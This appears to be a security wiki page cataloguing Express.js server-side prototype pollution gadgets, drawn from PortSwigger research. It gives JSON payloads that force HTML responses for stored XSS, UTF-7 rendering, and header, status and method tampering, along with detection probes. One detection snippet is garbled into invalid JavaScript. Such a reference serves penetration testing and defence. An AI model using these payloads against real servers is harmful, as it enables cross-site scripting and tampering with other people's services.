---
layout: page
title: Express Prototype Pollution Gadgets
category: nodejs
toc:
  sidebar: left
---

## Serve XSS responses

**For further details** [**take a look to the original reserach**](https://portswigger.net/research/server-side-prototype-pollution)

<br>

### Change JSON content-type to HTML

In an Express app using a **JSON content type response** and reflecting a JSON:

```javascript
app.use(bodyParser.json({ type: "application/json" }));
app.post("/", function (req, res) {
  _.merge({}, req.body);
  res.send(req.body);
});
```

In these cases XSS isn't normally possible with a JSON content type. However, with prototype pollution we can **confuse Express to serve up an HTML response.** This vulnerability relies on the application using **`res.send(obj)`** and using the body parser with the application/json content type.

```json
{ "__proto__": { "_body": true, "body": "<script>evil()" } }
```

By **polluting** **`body`** and **`_body`** properties, it's possible to cause **Express to serve up the HTML content type** and reflect the `_body` property, resulting in stored XSS.

<br>

### Render UTF7

It's possible to make express **render UTF-7 content with**:

```json
{ "__proto__": { "content-type": "application/json; charset=utf-7" } }
```

## Safe Scanning Techinques

<br>

### JSON spaces

The following PP will make attributes inside a JSON to have an extra space which won't break the functionality:

```json
{ "__proto__": { "json spaces": " " } }
```

Then a reflected JSON will looks like:

```json
{"foo":  "bar"} -- Note the extra space
```

<br>

### Exposed Headers

The following PP gadget will make the server send back the HTTP header: **`Access-Control-Expose_headers: foo`**

```json
{ "__proto__": { "exposedHeaders": ["foo"] } }
```

It requires the **CORS module to be installed**

<br>

### **OPTIONS Method**

With the following payload, it's possible to **hide a method from an OPTIONS response**:

```javascript
// Original reponse: POST,GET,HEAD

// Payload:
{"__proto__":{"head":true}}

//New response: POST;GET
```

<br>

### **Status**

It's possible to change the **returned status code** using the following PP payload:

```json
{ "__proto__": { "status": 510 } }
```

<br>

### Error

When you assign to a prototype with a primitive such as a string, it produces a **no-op operation since the prototype has to be an object**. If you attempt to assign a prototype object to the `Object.prototype` itself, this will **throw an exception**. We can use these two behaviours to **detect if prototype pollution was successful**:

```javascript
({}).__proto__.__proto__ = {}(
  //throws type exception
  {}
).__proto__.__proto__ = "x"; //no-op does not throw exception
```

<br>

### Reflected Value

When an application includes an object in its response, creating an attribute with an **unusual name alongside `__proto__`** can be insightful. Specifically, if **only the unusual attribute is returned** in the response, this could indicate the application's vulnerability:

```json
{ "unusualName": "value", "__proto__": "test" }
```

Moreover, in scenarios where a library like Lodash is employed, setting a property both via prototype pollution (PP) and directly inside the object offers another diagnostic approach. If such a property is omitted from the response, it suggests that Lodash is verifying the existence of the property in the target object before merging:

```javascript
{"__proto__":{"a":"value1"},"a":"value2","b":"value3"}
// If 'b' is the only property reflected, this indicates prototype pollution in Lodash
```

## Misc

<br>

### Allow Dots

There is an option in Express that allows you to **create objects from query string parameters**.\
You could definitely use it in a bug **chain** to exploit a **prototype pollution vulnerability**.

```json
{ "__proto__": { "allowDots": true } }
```

**`?foo.bar=baz` create an object in Node.**

## References

- [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)
